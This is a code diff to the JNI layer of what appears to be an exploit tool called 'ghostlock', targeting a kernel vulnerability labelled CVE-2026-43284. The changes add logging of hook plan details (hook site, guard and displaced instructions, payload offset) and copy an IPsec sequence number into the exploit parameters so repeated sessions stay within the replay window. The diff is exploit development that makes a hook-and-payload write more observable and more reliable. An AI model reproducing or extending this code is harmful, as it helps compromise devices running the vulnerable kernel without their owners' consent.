@@ -704,6 +704,10 @@ namespace ghostlock::jni {
     int device_access_initialize(const std::uint64_t accessId,
                                  const contract::AccessParams43284Values &values,
                                  const Init43284Values &sa_source) noexcept {
+        GL_LOGI("initialize received: seq=%lld present=%d spi=0x%08x encap=%u sender=%u",
+                static_cast<long long>(sa_source.initialSequence), sa_source.sequencePresent ? 1 : 0,
+                static_cast<unsigned>(sa_source.spi), static_cast<unsigned>(sa_source.encapPort),
+                static_cast<unsigned>(sa_source.senderPort));
         if (accessId == 0U) {
             return false;
         }
@@ -729,6 +733,9 @@ namespace ghostlock::jni {
          * 而 PageCacheLanding::bring_up_with 在「已拉起」时会返回 false —— 走这条路就不能先单独 bringUp。
          */
         params.sa = sa_material_of(sa_source);
+        /* 序号也要拷过来：同一 SA 上的后续会话必须接着前一个窗口的序号（防重放窗口由 SA 共享）。 */
+        params.sequence = static_cast<std::uint32_t>(sa_source.initialSequence);
+        params.sequence_set = sa_source.sequencePresent;
         /* 2026-10-15：工具那半调用方清单的其余字段（字符串借用式，全部由本栈帧持有）。 */
         const std::string hook_image = text_of(values.accessHookImagePath);
         const std::string kernel_release_text = text_of(values.accessKernelRelease);
@@ -931,7 +938,18 @@ namespace ghostlock::jni {
         request.plan = &plan;
         request.width = static_cast<std::uint64_t>(values.hookWidth);
         const char *refusal = nullptr;
-        return backend::cve_2026_43284::steps::write_hook(request, &refusal);
+        const bool hook_wrote = backend::cve_2026_43284::steps::write_hook(request, &refusal);
+        GL_LOGI("hook: plan site_file=0x%llx site_vaddr=0x%llx guard=0x%08x displaced=0x%08x payload_file=0x%llx max=%llu",
+                static_cast<unsigned long long>(plan.hook_file_offset),
+                static_cast<unsigned long long>(plan.hook_vaddr),
+                static_cast<unsigned>(plan.guard_instruction),
+                static_cast<unsigned>(plan.displaced_instruction),
+                static_cast<unsigned long long>(plan.payload_file_offset),
+                static_cast<unsigned long long>(plan.payload_max_bytes));
+        GL_LOGI("hook: write_hook wrote=%d refusal=%s plan=%p width=%llu", hook_wrote ? 1 : 0,
+                refusal != nullptr ? refusal : "(null)", static_cast<const void *>(request.plan),
+                static_cast<unsigned long long>(request.width));
+        return hook_wrote;
     }
 
 }  // namespace ghostlock::jni
